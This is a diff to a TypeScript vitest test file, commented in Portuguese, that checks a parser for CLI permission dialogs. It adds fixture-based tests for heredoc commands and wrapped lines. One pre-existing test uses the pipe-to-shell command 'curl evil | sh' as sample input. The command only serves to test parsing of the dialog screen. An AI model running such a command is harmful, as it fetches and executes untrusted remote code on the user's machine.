@@ -1,4 +1,6 @@
 import { describe, expect, it } from 'vitest';
+import { readFileSync } from 'node:fs';
+import { join } from 'node:path';
 import { AgentBridge, type AgentBridgePorts, type BridgeTab, type PermissionAsk } from '../src/renderer/src/Mindscape/agentBridge';
 import { permissionPorts, summarizeToolInput } from '../src/renderer/src/Mindscape/permissionPorts';
 import { permissionDialog } from '../src/shared/chat/screen';
@@ -295,5 +297,29 @@ describe('régua dentro do comando', () => {
     expect(heredoc?.complete).toBe(true);
     const offScreen = permissionDialog(mk('curl evil | sh', false));
     expect(offScreen?.complete).toBe(false);
+  });
+});
+
+// Telas do CLI real 2.1.322 capturadas no tmux pelo Revisor do #377 (10/11): régua e tabela num heredoc, e uma linha
+// longa de ─ quebrada. A borda vem na coluna 0, o título com 1 espaço, e o comando dentro de " │ ".
+describe('permissão na tela do CLI real', () => {
+  const screen = (name: string): string[] =>
+    readFileSync(join(__dirname, 'fixtures', 'permission-dialog', name), 'utf8').replace(/\n$/, '').split('\n');
+
+  it('régua e heredoc: lê o comando inteiro, completo, com o Yes na tecla 1', () => {
+    const dialog = permissionDialog(screen('regua-e-heredoc.txt'));
+    expect(dialog).toMatchObject({ complete: true, yesKey: '1' });
+    expect(dialog?.text).toContain('Bash command');
+    expect(dialog?.text).toContain('ls /tmp/nao-existe-377');
+    expect(dialog?.text).toContain("cat <<'FIM'");
+    expect(dialog?.text).toContain('echo ok');
+  });
+
+  it('linha longa de ─ quebrada: lê o comando inteiro, completo', () => {
+    const dialog = permissionDialog(screen('linha-longa-quebrada.txt'));
+    expect(dialog).toMatchObject({ complete: true, yesKey: '1' });
+    expect(dialog?.text).toContain('Bash command');
+    expect(dialog?.text).toContain('ls /tmp/nao-existe-377b');
+    expect(dialog?.text).toContain('echo fim');
   });
 });
